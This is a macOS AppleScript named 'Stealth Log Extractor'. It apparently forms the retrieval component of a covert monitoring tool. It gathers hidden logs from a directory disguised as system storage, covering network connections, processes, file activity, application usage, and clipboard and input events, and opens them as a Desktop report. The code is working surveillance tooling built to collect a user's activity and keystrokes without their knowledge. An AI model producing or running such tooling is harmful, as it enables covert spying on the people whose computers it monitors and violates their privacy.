(* Stealth Log Extractor - Retrieve collected data *)

on run
    try
        -- Extract all logs to a single report
        do shell script "
        # Create comprehensive report
        REPORT_FILE=~/Desktop/System_Report_$(date +%Y%m%d_%H%M%S).txt
        
        echo '=== DEEP macOS EVENT LOGS ===' > $REPORT_FILE
        echo 'Generated: $(date)' >> $REPORT_FILE
        echo '================================' >> $REPORT_FILE
        echo '' >> $REPORT_FILE
        
        # System events
        echo '--- SYSTEM EVENTS ---' >> $REPORT_FILE
        sqlite3 ~/Library/Containers/.SystemLogs/Data/.events.db 'SELECT * FROM system_events ORDER BY timestamp DESC LIMIT 100;' >> $REPORT_FILE 2>/dev/null || echo 'No system events' >> $REPORT_FILE
        echo '' >> $REPORT_FILE
        
        # Network activity
        echo '--- NETWORK ACTIVITY ---' >> $REPORT_FILE  
        tail -50 ~/Library/Containers/.SystemLogs/Data/.network_connections.log 2>/dev/null >> $REPORT_FILE || echo 'No network data' >> $REPORT_FILE
        echo '' >> $REPORT_FILE
        
        # Process changes
        echo '--- PROCESS CHANGES ---' >> $REPORT_FILE
        tail -50 ~/Library/Containers/.SystemLogs/Data/.process_changes.log 2>/dev/null >> $REPORT_FILE || echo 'No process data' >> $REPORT_FILE
        echo '' >> $REPORT_FILE
        
        # File system events
        echo '--- FILE SYSTEM EVENTS ---' >> $REPORT_FILE
        tail -50 ~/Library/Containers/.SystemLogs/Data/.fs_events.log 2>/dev/null >> $REPORT_FILE || echo 'No file system data' >> $REPORT_FILE
        echo '' >> $REPORT_FILE
        
        # UI events
        echo '--- APPLICATION USAGE ---' >> $REPORT_FILE
        tail -50 ~/Library/Containers/.SystemLogs/Data/.ui_events.log 2>/dev/null >> $REPORT_FILE || echo 'No UI data' >> $REPORT_FILE
        echo '' >> $REPORT_FILE
        
        # Input events
        echo '--- CLIPBOARD & INPUT ---' >> $REPORT_FILE
        tail -20 ~/Library/Containers/.SystemLogs/Data/.input_events.log 2>/dev/null >> $REPORT_FILE || echo 'No input data' >> $REPORT_FILE
        
        echo '' >> $REPORT_FILE
        echo '=== END OF REPORT ===' >> $REPORT_FILE
        
        # Open the report in a allowed app
        open -a 'Google Chrome' $REPORT_FILE
        "
        
        display notification "System report generated on Desktop" with title "Report Complete"
        
    on error errMsg
        display dialog "Error generating report: " & errMsg
    end try
end run